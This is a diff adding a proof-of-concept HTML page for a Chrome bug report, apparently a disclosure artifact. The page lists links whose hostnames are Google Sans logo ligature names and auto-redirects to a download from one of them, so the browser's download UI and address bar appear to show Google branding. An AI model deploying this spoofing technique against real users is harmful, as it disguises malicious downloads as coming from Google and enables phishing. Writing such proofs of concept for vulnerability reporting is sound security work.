@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; }
+#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<h1>PoC: Google Sans ligatures spoof in Download UI (and omnibar in some cases)</h1>
+<p>Based on https://crbug.com/391788835, applies to all ligatures.</p>
+<p>Note: The "File can't be download securely" warning is only because we don't have a valid cert for HTTPS connection. This would not appear in a real attack.</p>
+<ul id="ligatureList"></ul>
+<script>
+var ligatures = [
+    "googlelogoligature",
+    "glogoligature",
+    "ologoligature",
+    "llogoligature",
+    "elogoligature",
+    "g_logo",
+    "o_logo",
+    "l_logo",
+    "e_logo",
+    "google_logo",
+    "google_g",
+    "super_g_logo",
+]
+var appendItem = (htmlContent) => {
+    var listItem = document.createElement('li');
+    listItem.innerHTML = htmlContent;
+    ligatureList.appendChild(listItem);
+}
+
+var appendSpacer = () => {
+    ligatureList.appendChild(document.createElement('hr'));
+}
+
+ligatures.forEach(ligature => {
+    appendItem(`<a href="http://${ligature}.com/download.zip" target="_blank">http://${ligature}.com/download.zip</a> (target=_blank)`);
+
+    appendItem(`<a href="http://${ligature}.com/download.zip" target="_self">http://${ligature}.com/download.zip</a> (target=_self)`);
+
+    appendItem(`<a href="http://${ligature}.com/" target="_blank">http://${ligature}.com/</a>`);
+
+    appendSpacer();
+});
+setTimeout(() => {
+    window.location = 'https://googlelogoligature.com/download.zip';
+}, 1000);
+</script>
+</body>
+</html>
